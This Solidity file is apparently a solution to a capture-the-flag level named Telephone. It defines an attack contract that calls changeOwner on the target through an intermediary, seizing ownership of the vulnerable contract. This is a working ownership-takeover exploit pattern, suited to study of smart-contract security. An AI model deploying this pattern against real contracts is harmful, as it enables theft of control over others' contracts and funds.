// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephoeAttack{

    Telephone phone;

    constructor(address _telephone) {
        phone = Telephone(_telephone);
    }
    function attack(address _owner) public {
        phone.changeOwner(_owner);
    }
}